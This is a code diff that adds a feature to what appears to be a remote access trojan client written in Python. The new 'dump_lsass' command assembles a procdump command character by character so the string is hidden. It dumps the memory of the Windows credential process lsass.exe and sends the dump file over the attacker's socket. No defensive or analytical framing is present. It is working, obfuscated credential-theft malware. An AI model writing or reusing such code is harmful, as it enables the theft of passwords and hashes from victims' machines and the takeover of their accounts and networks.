@@ -549,6 +549,26 @@ class RAT_CLIENT:
                 except WindowsError:
                     self.errorsend()
 
+            elif command == 'dump_lsass':
+                try:
+                    procdump_cmd = ''.join([
+                        "p", "r", "o", "c", "d", "u", "m", "p", ".", "e", "x", "e",
+                        " ", "-", "a", "c", "c", "e", "p", "t", "e", "u", "l", "a",
+                        " ", "-", "m", "a", " ", "l", "s", "a", "s", "s", ".", "e", "x", "e",
+                        " ", "l", "s", "a", "s", "s", ".", "d", "m", "p"
+                    ])
+                    
+                    os.system(procdump_cmd)
+                    
+                    with open("lsass.dmp", "rb") as dump_file:
+                        dump_data = dump_file.read()
+                        s.sendall(dump_data)
+                    
+                    s.send(b"LSASS dump completed and sent")
+                    
+                except Exception as e:
+                    self.errorsend()
+
             elif command == 'fzlx':
                 s.send(b"exit")
                 break
